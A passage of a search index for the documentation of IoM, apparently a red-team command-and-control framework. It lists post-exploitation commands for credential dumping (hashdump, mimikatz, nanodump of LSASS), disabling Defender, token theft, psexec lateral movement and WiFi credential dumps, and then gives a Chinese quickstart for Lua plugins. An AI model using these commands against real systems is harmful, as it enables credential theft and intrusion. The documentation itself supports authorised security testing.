</ul>"},{"location":"IoM/manual/mal/embed/#exclusion-enum","title":"exclusion enum","text":"<p>Enumerate Windows Defender exclusions</p> <pre><code>exclusion enum [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>exclusion    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#hashdump","title":"hashdump","text":"<p>Dump the SAM, SECURITY and SYSTEM registries</p> <pre><code>hashdump [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#ipconfig","title":"ipconfig","text":"<p>Display network configuration</p> <pre><code>ipconfig [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#kill_defender","title":"kill_defender","text":"<p>Kill or check Windows Defender  <pre><code>kill_defender [flags]\n</code></pre> <p>Options</p> <pre><code>      --action string        action to perform (kill or check)\n  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#klist","title":"klist","text":"<p>Interact with cached Kerberos tickets [action] [spn]</p> <pre><code>klist [flags]\n</code></pre> <p>Options</p> <pre><code>      --action string        action to perform (get, purge, or empty to list)\n  -h, --help                 print help\n  -f, --output_file string   output file\n      --spn string           target SPN (required for 'get' action)\n</code></pre>"},{"location":"IoM/manual/mal/embed/#ldapsearch","title":"ldapsearch","text":"<p>Perform LDAP search  [attributes] [result_count] [hostname] [domain] <pre><code>ldapsearch [flags]\n</code></pre> <p>Options</p> <pre><code>      --attributes string     comma separated attributes (empty for all)\n      --domain string         Distinguished Name to use (empty for Base domain)\n  -h, --help                  print help\n      --hostname string       DC hostname or IP (empty for Primary DC)\n  -f, --output_file string    output file\n      --query string          LDAP query string\n      --result-count string   maximum number of results (0 for all) (default \"0\")\n</code></pre>"},{"location":"IoM/manual/mal/embed/#load_prebuild","title":"load_prebuild","text":"<p>load full|fs|execute|sys|rem precompiled modules</p> <pre><code>load_prebuild [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#logonpasswords","title":"logonpasswords","text":"<p>Extract logon passwords using mimikatz</p> <pre><code>logonpasswords [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#memoryinfo","title":"memoryinfo","text":"<p>Get system memory information</p> <pre><code>memoryinfo [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#memreader","title":"memreader","text":"<p>Read memory from target process   [output-size] <pre><code>memreader [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n      --output-size string   output size limit (default \"10\")\n  -f, --output_file string   output file\n      --pattern string       memory pattern to search\n      --target-pid string    target process ID\n</code></pre>"},{"location":"IoM/manual/mal/embed/#mimikatz","title":"mimikatz","text":"<p>Execute mimikatz with specified commands</p> <pre><code>mimikatz [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#move","title":"move","text":"<p>SEE ALSO</p> <ul> <li>move psexec    - Execute service on target host using psexec"},{"location":"IoM/manual/mal/embed/#move-psexec","title":"move psexec","text":"<p>Execute service on target host using psexec  <pre><code>move psexec [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n      --host string          target host\n  -f, --output_file string   output file\n      --path string          local path to service executable\n      --service string       service name\n</code></pre> <p>SEE ALSO</p> <ul> <li>move  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#nanodump","title":"nanodump","text":"<p>Advanced LSASS memory dumping tool</p> <pre><code>nanodump [flags]\n</code></pre> <p>Options</p> <pre><code>      --chunk-size string                  chunk size in KB (default: 924)\n      --duplicate                          duplicate an existing LSASS handle\n      --duplicate-elevate                  duplicate and elevate handle\n      --elevate-handle                     elevate handle privileges\n      --fork                               fork the target process\n      --getpid                             get the PID of LSASS and exit\n  -h, --help                               print help\n  -f, --output_file string                 output file\n      --pid string                         target process PID (default: auto-detect LSASS)\n      --seclogon-duplicate                 use SecLogon duplicate\n      --seclogon-leak-local                use SecLogon leak (local)\n      --seclogon-leak-remote               use SecLogon leak (remote)\n      --seclogon-leak-remote-path string   path for remote SecLogon leak binary\n      --shtinkering                        use LSASS shtinkering technique\n      --silent-process-exit                use silent process exit\n      --silent-process-exit-path string    path for silent process exit\n      --snapshot                           snapshot the target process\n      --spoof-callstack                    spoof the call stack\n      --valid                              create a minidump with a valid signature\n      --write                              write minidump to disk\n      --write-path string                  path to write the minidump\n</code></pre>"},{"location":"IoM/manual/mal/embed/#net","title":"net","text":"<p>SEE ALSO</p> <ul> <li>net user  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#net-user","title":"net user","text":"<p>SEE ALSO</p> <ul> <li>net    - </li> <li>net user add  - Add a new user account  <li>net user enum    - Enumerate network users [type]</li> <li>net user query  - Query user information  [domain]"},{"location":"IoM/manual/mal/embed/#net-user-add","title":"net user add","text":"<p>Add a new user account  <pre><code>net user add [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --password string      the password to set\n      --username string      the username to add\n</code></pre> <p>SEE ALSO</p> <ul> <li>net user  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#net-user-enum","title":"net user enum","text":"<p>Enumerate network users [type]</p> <pre><code>net user enum [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --type string          enumeration type (all, locked, disabled, active) (default \"all\")\n</code></pre> <p>SEE ALSO</p> <ul> <li>net user  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#net-user-query","title":"net user query","text":"<p>Query user information  [domain] <pre><code>net user query [flags]\n</code></pre> <p>Options</p> <pre><code>      --domain string        domain name (optional)\n  -h, --help                 print help\n  -f, --output_file string   output file\n      --username string      username to query\n</code></pre> <p>SEE ALSO</p> <ul> <li>net user  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#nslookup","title":"nslookup","text":"<p>DNS lookup  [server] [record-type] <pre><code>nslookup [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n      --host string          hostname or IP to lookup\n  -f, --output_file string   output file\n      --record-type string   DNS record type (A, NS, CNAME, MX, AAAA, etc.) (default \"A\")\n      --server string        DNS server to use (optional)\n</code></pre>"},{"location":"IoM/manual/mal/embed/#pingscan","title":"pingscan","text":"<p>Ping scan target  <pre><code>pingscan [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --target string        IP or hostname(eg. 10.10.121.100-10.10.121.120,192.168.0.1/24)\n</code></pre>"},{"location":"IoM/manual/mal/embed/#portscan","title":"portscan","text":"<p>Port scan target   [timeout] <pre><code>portscan [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --ports string         ports to scan (e.g., 80,443,8080 or 1-1000)\n      --target string        IPv4 ranges and CIDR (eg. 192.168.1.128, 192.168.1.128-192.168.2.240, 192.168.1.0/24)\n</code></pre>"},{"location":"IoM/manual/mal/embed/#readfile","title":"readfile","text":"<p>Read file content  <pre><code>readfile [flags]\n</code></pre> <p>Options</p> <pre><code>      --filepath string      path to the file to read\n  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#rem_community","title":"rem_community","text":"<p>SEE ALSO</p> <ul> <li>rem_community connect    - connect to rem</li> <li>rem_community fork  - fork rem</li> <li>rem_community load  - load rem with rem.dll</li> <li>rem_community log    - get rem log</li> <li>rem_community run    - run rem</li> <li>rem_community socks5  - serving socks5 with rem</li> <li>rem_community stop  - stop rem</li> </ul>"},{"location":"IoM/manual/mal/embed/#rem_community-connect","title":"rem_community connect","text":"<p>connect to rem</p> <pre><code>rem_community connect [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem_community    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#rem_community-fork","title":"rem_community fork","text":"<p>fork rem</p> <pre><code>rem_community fork [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n      --local_url string     local_url\n      --mod string           mod\n  -f, --output_file string   output file\n      --remote_url string    remote_url\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem_community    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#rem_community-load","title":"rem_community load","text":"<p>load rem with rem.dll</p> <pre><code>rem_community load [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem_community    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#rem_community-log","title":"rem_community log","text":"<p>get rem log</p> <pre><code>rem_community log [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem_community    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#rem_community-run","title":"rem_community run","text":"<p>run rem</p> <pre><code>rem_community run [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --pipe string          pipe\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem_community    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#rem_community-socks5","title":"rem_community socks5","text":"<p>serving socks5 with rem</p> <pre><code>rem_community socks5 [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --pass string          pass\n      --port string          port\n      --user string          user\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem_community    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#rem_community-stop","title":"rem_community stop","text":"<p>stop rem</p> <pre><code>rem_community stop [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>rem_community    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#route","title":"route","text":"<p>SEE ALSO</p> <ul> <li>route print    - Display routing table</li> </ul>"},{"location":"IoM/manual/mal/embed/#route-print","title":"route print","text":"<p>Display routing table</p> <pre><code>route print [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>route    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#screenshot","title":"screenshot","text":"<p>Command: situational screenshot  <pre><code>screenshot [flags]\n</code></pre> <p>Options</p> <pre><code>      --filename string      filename to save screenshot (default \"screenshot.jpg\")\n  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#systeminfo","title":"systeminfo","text":"<p>Display system information</p> <pre><code>systeminfo [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre>"},{"location":"IoM/manual/mal/embed/#token","title":"token","text":"<p>SEE ALSO</p> <ul> <li>token make  - Create impersonated token from credentials   [type] <li>token steal    - Steal access token from a process"},{"location":"IoM/manual/mal/embed/#token-make","title":"token make","text":"<p>Create impersonated token from credentials   [type] <pre><code>token make [flags]\n</code></pre> <p>Options</p> <pre><code>      --domain string        domain for token creation\n  -h, --help                 print help\n  -f, --output_file string   output file\n      --password string      password for token creation\n      --type string          logon type (2-Interactive, 3-Network, 4-Batch, 5-Service, 8-NetworkCleartext, 9-NewCredentials) (default \"9\")\n      --username string      username for token creation\n</code></pre> <p>SEE ALSO</p> <ul> <li>token    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#token-steal","title":"token steal","text":"<p>Steal access token from a process  <pre><code>token steal [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --pid string           process ID to steal token from\n</code></pre> <p>SEE ALSO</p> <ul> <li>token    - </li> </ul>"},{"location":"IoM/manual/mal/embed/#wifi","title":"wifi","text":"<p>SEE ALSO</p> <ul> <li>wifi dump    - Dump WiFi profile credentials  <li>wifi enum    - Enumerate WiFi profiles</li>"},{"location":"IoM/manual/mal/embed/#wifi-dump","title":"wifi dump","text":"<p>Dump WiFi profile credentials  <pre><code>wifi dump [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n      --profilename string   WiFi profile name to dump\n</code></pre> <p>SEE ALSO</p> <ul> <li>wifi  - </li> </ul>"},{"location":"IoM/manual/mal/embed/#wifi-enum","title":"wifi enum","text":"<p>Enumerate WiFi profiles</p> <pre><code>wifi enum [flags]\n</code></pre> <p>Options</p> <pre><code>  -h, --help                 print help\n  -f, --output_file string   output file\n</code></pre> <p>SEE ALSO</p> <ul> <li>wifi  - </li> </ul>"},{"location":"IoM/manual/mal/quickstart/","title":"mal\u5feb\u901f\u5165\u95e8","text":""},{"location":"IoM/manual/mal/quickstart/#intro","title":"Intro","text":"<p>IoM \u57fa\u4e8elua5.1\u4ee5\u53cagopher-lua\u5b9e\u73b0\u4e86\u4e00\u5957\u590d\u6742\u4f46\u5f3a\u5927\u7684\u63d2\u4ef6\u7cfb\u7edf mals</p> <ul> <li>\u4e00\u7ec4\u7c7b\u4f3cAggressiveScript\u7684\u7b80\u5316api</li> <li>\u4e00\u7ec4\u5168\u91cf\u529f\u80fd\u7684\u539f\u59cbgrpc api</li> <li>\u4e00\u7cfb\u5217\u65b9\u4fbf\u7684\u5185\u7f6elua\u5e93</li> </ul> <p>lua \u662f\u4e00\u95e8\u975e\u5e38\u7b80\u5355\u7684\u811a\u672c\u8bed\u8a00, \u9605\u8bfb\u51e0\u4e2a\u793a\u4f8b\u540e\u8bfb\u8005\u5e94\u8be5\u5c31\u53ef\u4ee5\u76f4\u63a5\u4e0a\u624b\u4f7f\u7528, \u51e0\u4e4e\u4e0d\u9700\u8981\u770blua\u7684\u76f8\u5173\u6587\u6863, \u5982\u679c\u4f60\u51c6\u5907\u4ece\u96f6\u5f00\u59cb\u7f16\u5199\u63d2\u4ef6, \u63a8\u8350\u4f7f\u7528vscode+sumneko\u63d2\u4ef6</p>"},{"location":"IoM/manual/mal/quickstart/#\u57fa\u7840\u4f7f\u7528","title":"\u57fa\u7840\u4f7f\u7528","text":""},{"location":"IoM/manual/mal/quickstart/#hello-world","title":"Hello World","text":"<p>\u7f16\u5199hello.lua</p> <pre><code>print(\"hello world\") -- \u5728client\u7684\u6807\u51c6\u8f93\u51fa\u4e2d\u6253\u5370hello world\n\nbroadcast(\"hello world\") -- \u5728\u6240\u6709\u7684client\u4e2d\u6253\u5370hello world\n\nnotify(\"hello world\") -- \u5728\u6240\u6709client\u4e2d\u6253\u5370, \u5e76\u4e14\u5982\u679c\u914d\u7f6e\u4e86\u7b2c\u4e09\u65b9\u901a\u77e5\u63a5\u53e3(\u98de\u4e66,tg,\u5fae\u4fe1) \u5219\u540c\u65f6\u4f1a\u5728\u5411\u7b2c\u4e09\u65b9\u53d1\u9001\u901a\u77e5\n</code></pre> <p>\u4e3a\u4e86\u8ba9\u8fd9\u4e2a\u63d2\u4ef6\u80fd\u88ab\u6b63\u786e\u52a0\u8f7d, \u6211\u4eec\u8fd8\u9700\u8981\u7f16\u5199 mal.yaml \u8ba9IoM\u53ef\u4ee5\u8bc6\u522b.</p> <pre><code>name: hello\ntype: lua\nauthor: M09Ic\nversion: v0.0.1\nentry: hello.lua\n</code></pre> <p>\u5c06\u8fd9\u4e24\u4e2a\u6587\u4ef6\u90fd\u653e\u5728\u63d2\u4ef6\u7684\u9ed8\u8ba4\u4fdd\u5b58\u76ee\u5f55\u4e0b\u5373\u53ef</p> <p>windows: <code>%USERPROFILE%/.config/malice/mals/hello/</code> linux: <code>~/.config/malice/mals/hello</code></p> <pre><code>mal load hello\n</code></pre> <p></p> <p>\u5206\u53d1\u63d2\u4ef6</p> <p>\u793e\u533a\u4ed3\u5e93 \u4e2d\u7684\u63d2\u4ef6\u90fd\u901a\u8fc7zip\u5305\u5206\u53d1. </p> <p>\u4e5f\u53ef\u4ee5\u5c06\u521a\u521a\u7684<code>hello.lua</code> \u548c <code>mal.yaml</code> \u6253\u5305\u6210zip, \u7136\u540e\u547d\u4ee4\u5b89\u88c5</p> <p><code>mal install hello.zip</code></p>"},{"location":"IoM/manual/mal/quickstart/#\u6ce8\u518c\u547d\u4ee4","title":"\u6ce8\u518c\u547d\u4ee4","text":"<p>\u901a\u8fc7command\u51fd\u6570\uff0c \u53ef\u4ee5\u5c06lua\u7684\u51fd\u6570\u6ce8\u518c\u5230IoM client\u7684\u547d\u4ee4\u4e2d\u3002</p> <p>\u5982\u4e0b\u5c06\u4e3e\u4e00\u4e9b\u5e38\u89c1\u7684\u4f8b\u5b50:</p>"},{"location":"IoM/manual/mal/quickstart/#\u57fa\u672c\u8bed\u6cd5","title":"\u57fa\u672c\u8bed\u6cd5","text":"<pre><code>command(name, function, help, ttp)\n</code></pre> <ul> <li>name: \u547d\u4ee4\u540d\u79f0\uff0c\u652f\u6301\u591a\u7ea7\u547d\u4ee4\uff08\u7528:\u5206\u9694\uff09</li> <li>function: \u6267\u884c\u7684lua\u51fd\u6570</li> <li>help: \u547d\u4ee4\u5e2e\u52a9\u4fe1\u606f</li> <li>ttp: MITRE ATT&amp;CK TTP\u7f16\u53f7</li> </ul> <p>\u8be6\u7ec6\u6587\u6863\u8bf7\u89c1\uff1ahttps://wiki.chainreactors.red/IoM/manual/mal/builtin/#command</p>"},{"location":"IoM/manual/mal/quickstart/#\u57fa\u7840\u7528\u6cd5","title":"\u57fa\u7840\u7528\u6cd5","text":""},{"location":"IoM/manual/mal/quickstart/#\u7b80\u5355\u547d\u4ee4\u6ce8\u518c","title":"\u7b80\u5355\u547d\u4ee4\u6ce8\u518c","text":"<p><pre><code>-- print hello world\nlocal function hello()\n    print(\"hello world\")\nend\n\ncommand(\"hello\", hello, \"print hello world\", \"T1000\")\n</code></pre> \u5728\u5ba2\u6237\u7aef\u6267\u884chello\u547d\u4ee4\u65f6\uff0c\u5c06\u8c03\u7528hello\u51fd\u6570\u5e76\u8f93\u51fa\"hello world\"\u3002</p>"},{"location":"IoM/manual/mal/quickstart/#\u591a\u7ea7\u547d\u4ee4\u6ce8\u518c","title":"\u591a\u7ea7\u547d\u4ee4\u6ce8\u518c","text":"<p>\u5728\u590d\u6742\u573a\u666f\u4e2d\uff0c \u4f8b\u5982mimikatz \u62e5\u6709\u591a\u4e2a\u5e38\u89c1\u7528\u6cd5 logonpasswords  tickets   \u3002 \u6211\u4eec\u9700\u8981\u5176\u6ce8\u518c\u4e3amimikatz\u7684\u5b50\u547d\u4ee4\u3002 </p> <pre><code>local function logonpasswords()\n    ...\nend\n\nlocal function tickets()\n    ...\nend\n\ncommand(\"mimikatz:logonpasswords\", logonpasswords, \"logonpasswords\", \"T1000\")\ncommand(\"mimikatz:tickets\", logonpasswords, \"logonpasswords\", \"T1000\")\n</code></pre> <p><code>:</code> \u8868\u793a\u5b50\u547d\u4ee4\u7684\u5206\u9694\u7b26\uff0c \u53ef\u4ee5\u6dfb\u52a0\u4efb\u610f\u5c42\u7ea7\u7684\u5b50\u547d\u4ee4</p> <pre><code>command(\"mimikatz:common:hello\", hello, \"print hello world\", \"T1000\")\n</code></pre>"},{"location":"IoM/manual/mal/quickstart/#\u53c2\u6570\u5904\u7406","title":"\u53c2\u6570\u5904\u7406","text":"<p>\u5728\u547d\u4ee4\u884c\u7a0b\u5e8f\u4e2d\uff0c\u901a\u5e38\u5c06\u547d\u4ee4\u884c\u7684\u8f93\u5165\u5206\u4e3a:</p> <ul> <li>args, <code>hello arg1 arg2</code>, </li> <li>flags, POSIX\u4e2d\u5206\u4e3a long|short flag . <code>hello -s</code> \u548c<code>hello --long</code></li> <li>cmdline, \u8868\u793a\u5b8c\u6574\u7684\u547d\u4ee4\u884c\u5b57\u7b26\u4e32</li> </ul> <p>\u5728IoM\u4e2d\u8fd8\u6709\u4e00\u7c7b\u7279\u6b8a\u7684\u7528\u6cd5\u3002 \u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f20\u5165cobra(\u4e00\u4e2a\u88ab\u5e7f\u6cdb\u4f7f\u7528\u7684\u547d\u4ee4\u884c\u5e93)\u7684cmd \u5bf9\u8c61\u5bf9\u8c61\u3002 \u7528\u6765\u624b\u52a8\u89e3\u6790flag\u548carg\u3002</p> <p>\u901a\u8fc7\u8fd9\u4e9b\u65b9\u5f0f\uff0cIoM mal\u63d0\u4f9b\u4e86\u63a5\u8fd1golang\u539f\u751f\u7684\u547d\u4ee4\u884c\u63a7\u5236\u80fd\u529b\uff0c \u5305\u62ec\u6ce8\u518c\u3001\u89e3\u6790\u751a\u81f3\u81ea\u52a8\u8865\u5168\u7684\u80fd\u529b\u3002 </p>"},{"location":"IoM/manual/mal/quickstart/#args","title":"args","text":"<p><pre><code>local function print_args(args)\n    print(args[1])\n    print(args[2])\nend\n\ncommand(\"hello\", print_args, \"print args\", \"T1000\")\n</code></pre> \u6267\u884c<code>hello arg1 arg2</code>\u65f6\uff0c\u5c06\u8c03\u7528print_args\u51fd\u6570\uff0c\u8f93\u51faarg1\u548carg2\u3002\u6ce8\u610fLua\u6570\u7ec4\u7d22\u5f15\u4ece1\u5f00\u59cb\u3002 </p> <p><code>arg_&lt;number&gt;</code></p> <p><pre><code>local function print_args(arg_1, arg_2, arg_3)\n    print(arg_1)\n    print(arg_2)\n    print(arg_3)\nend\n\ncommand(\"hello\", print_args, \"print args\", \"T1000\")\n</code></pre> \u6267\u884chello arg1 arg2 arg3\u65f6\uff0c\u5c06\u8c03\u7528print_args\u51fd\u6570\uff0c\u5206\u522b\u8f93\u51fa\u4e09\u4e2a\u53c2\u6570\u3002\u6b64\u65b9\u5f0f\u9002\u7528\u4e8e\u53c2\u6570\u6570\u91cf\u56fa\u5b9a\u4e14\u8f83\u5c11\u7684\u573a\u666f\u3002</p>"},{"location":"IoM/manual/mal/quickstart/#flags","title":"flags","text":"<p><pre><code>local function print_flags(cmd)\n    local name = cmd:Flags():GetString(\"name\")\n    print(name)\nend\n\nlocal cmd = command(\"hello\", print_flags, \"print flags\", \"T1000\")\ncmd:Flags():String(\"name\", \"\", \"the name to print\")\n</code></pre> \u6267\u884chello --name flag1\u65f6\uff0c\u5c06\u8c03\u7528print_flags\u51fd\u6570\uff0c\u8f93\u51faflag1\u3002\u6b64\u65b9\u5f0f\u9002\u7528\u4e8e\u53c2\u6570\u8f83\u591a\u6216\u9700\u8981\u7cbe\u786e\u63a7\u5236\u7684\u573a\u666f\u3002</p> <p><code>flag_&lt;name&gt;</code>\u81ea\u52a8\u6ce8\u518c</p> <p><pre><code>local function print_flags(flag_name)\n    local name = flag_name\n    print(name)\nend\n\nlocal cmd = command(\"hello\", print_flags, \"print flags\", \"T1000\")\n</code></pre> \u4f7f\u7528<code>flag_&lt;name&gt;</code>\u683c\u5f0f\u7684\u53c2\u6570\u4f1a\u81ea\u52a8\u6ce8\u518c\u4e3a\u6807\u5fd7\u53c2\u6570\u3002\u6267\u884chello --name flag1\u65f6\uff0c\u5c06\u8c03\u7528print_flags\u51fd\u6570\uff0c\u8f93\u51faflag1\u3002\u6b64\u65b9\u5f0f\u4ee3\u7801\u66f4\u7b80\u6d01\uff0c\u9002\u7528\u4e8e\u53c2\u6570\u8f83\u5c11\u7684\u573a\u666f\u3002</p>"},{"location":"IoM/manual/mal/quickstart/#cmdline","title":"cmdline","text":"<p><pre><code>local function print_cmdline(cmdline)\n    print(cmdline)\nend\n\ncommand(\"hello\", print_cmdline, \"print cmdline\", \"T1000\")\n</code></pre> cmdline\u53c2\u6570\u4f1a\u5c06\u6240\u6709\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u7a7a\u683c\u5206\u9694\u62fc\u63a5\u4e3a\u5b57\u7b26\u4e32\u3002\u6267\u884chello arg1 arg2 arg3\u65f6\uff0c\u5c06\u8f93\u51faarg1 arg2 arg3\u3002</p>"},{"location":"IoM/manual/mal/quickstart/#cmd","title":"cmd","text":""},{"location":"IoM/manual/mal/quickstart/#\u8f85\u52a9\u51fd\u6570","title":"\u8f85\u52a9\u51fd\u6570","text":"<p>\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u8ba9\u8fd9\u4e2a\u547d\u4ee4\u66f4\u52a0\u4e30\u5bcc\u3002</p> <ul> <li>help, <code>help(\"hello\", \"a description for this command\")</code> , \u6dfb\u52a0long helper</li> <li>example, <code>example(\"hello\", \"a example for this command\")</code> \u6dfb\u52a0\u547d\u4ee4\u884cexmaple</li> <li>opsec, <code>opsec(\"hello\", 9.8)</code> , \u6dfb\u52a0OPSEC \u8bc4\u5206</li> </ul> <p>\u6dfb\u52a0compleler \u81ea\u52a8\u8865\u5168,  \u6211\u4eec\u63d0\u4f9b\u4e86\u591a\u7ec4\u573a\u666f\u7684\u81ea\u52a8\u8865\u5168\u53c2\u6570</p> <p>\u793a\u4f8b:</p> <pre><code>local rem_socks_cmd = command(\"rem_community:socks5\", run_socks5, \"serving socks5 with rem\", \"T1090\")\n\nbind_args_completer(rem_socks_cmd, { rem_completer() })\n</code></pre>"},{"location":"IoM/manual/mal/quickstart/#\u6807\u51c6\u5185\u7f6e\u5e93","title":"\u6807\u51c6&amp;\u5185\u7f6e\u5e93","text":""},{"location":"IoM/manual/mal/quickstart/#mal-package","title":"mal package","text":"<p>\u76ee\u524dmal\u5df2\u7ecf\u5b9e\u73b0\u4e86\u6570\u767e\u4e2aapi, \u4e3a\u4e86\u66f4\u597d\u7684\u7ba1\u7406\u4e0e\u5206\u7c7b\u8fd9\u4e9bapi. \u6211\u4eec\u5c06\u8fd9\u4e9bapi\u5206\u5230\u4e09\u4e2apackage\u4e2d.</p> <ul> <li>builtin, \u76f4\u63a5\u5728\u5f53\u524d\u4e0a\u4e0b\u6587\u53ef\u7528, mal\u76f8\u5173\u6838\u5fc3api</li> <li>rpc, grpc\u76f8\u5173api\u7684lua\u5b9e\u73b0</li> <li>beacon, \u5bf9CobaltStrike\u7684\u517c\u5bb9\u5c42api. \u5b9e\u73b0\u4e86\u5927\u91cf\u4e0eaggressive scirpt\u4e2d<code>b</code>\u5f00\u5934\u51fd\u6570\u7b49\u4ef7\u7684api</li> </ul>"},{"location":"IoM/manual/mal/quickstart/#lua-\u6807\u51c6\u5e93","title":"lua \u6807\u51c6\u5e93","text":"<p>mal lua\u4e2d\u540c\u6837\u652f\u6301lua\u6807\u51c6\u5e93, \u76f8\u5173\u6587\u6863\u53ef\u4ee5\u67e5\u9605 lua5.1\u6587\u6863. \u5173\u4e8e\u5f02\u6b65/\u5e76\u53d1\u7684\u6587\u6863\u53ef\u4ee5\u67e5\u9605 https://github.com/yuin/gopher-lua \u4e0e http://godoc.org/github.com/yuin/gopher-lua</p> <ul> <li>package</li> <li>table</li> <li>io</li> <li>os</li> <li>string</li> <li>math</li> <li>debug</li> <li>channel</li> <li>coroutine</li> </ul>"},{"location":"IoM/manual/mal/quickstart/#lua-\u62d3\u5c55\u5e93","title":"lua \u62d3\u5c55\u5e93","text":"<p>\u4e3a\u4e86\u66f4\u65b9\u4fbf\u7684\u4f7f\u7528\uff0c\u6211\u4eec\u5df2\u7ecf\u5bfc\u5165\u4e86\u8bb8\u591a\u5e38\u7528\u5de5\u5177\u5305\u3002</p> <p>\u5f53\u524d\u6dfb\u52a0\u7684\u62d3\u5c55\u5e93: </p> <ul> <li>argparse argparse CLI parsing https://github.com/luarocks/argparse</li> <li>base64 encoding/base64 api</li> <li>cmd cmd port</li> <li>db access to databases</li> <li>filepath path.filepath port</li> <li>goos os port</li> <li>humanize humanize github.com/dustin/go-humanize port</li> <li>inspect pretty print github.com/kikito/inspect.lua</li> <li>ioutil io/ioutil port</li> <li>json json implementation</li> <li>log log port</li> <li>plugin run lua code in lua code</li> <li>regexp regexp port</li> <li>shellescape shellescape https://github.com/alessio/shellescape port</li> <li>stats stats https://github.com/montanaflynn/stats port</li> <li>storage package for store persist data and share values between lua states</li> <li>strings strings port (utf supported)</li> <li>tcp raw tcp client lib</li> <li>template template engines</li> <li>time time port</li> <li>yaml gopkg.in/yaml.v2 port</li> <li>http http</li> <li>crypto  hash(md5, sha1,sha256, HMAC...), base64, aes</li> </ul> <p>\u4f60\u53ef\u4ee5\u901a\u8fc7 require \u5f15\u5165\u5bf9\u5e94\u7684\u4f9d\u8d56\uff0c\u6bcf\u4e2a\u4ed3\u5e93\u7684README\u4e2d\u90fd\u6709\u8f83\u4e3a\u8be6\u7ec6\u7684\u4f7f\u7528\u8bf4\u660e</p> <pre><code>local crypto = require(\"crypto\")\n</code></pre>"},{"location":"IoM/manual/mal/quickstart/#\u63d2\u4ef6\u67b6\u6784","title":"\u63d2\u4ef6\u67b6\u6784","text":""},{"location":"IoM/manual/mal/quickstart/#\u63d2\u4ef6\u7ec4\u6210","title":"\u63d2\u4ef6\u7ec4\u6210","text":"<p>\u6bcf\u4e2aMal\u63d2\u4ef6\u7531\u4ee5\u4e0b\u90e8\u5206\u7ec4\u6210\uff1a</p> \u7ec4\u4ef6 \u8bf4\u660e \u5fc5\u9700 mal.yaml \u63d2\u4ef6\u5143\u6570\u636e\u914d\u7f6e \u2705 entry\u811a\u672c Lua\u5165\u53e3\u6587\u4ef6 \u2705 \u8d44\u6e90\u6587\u4ef6 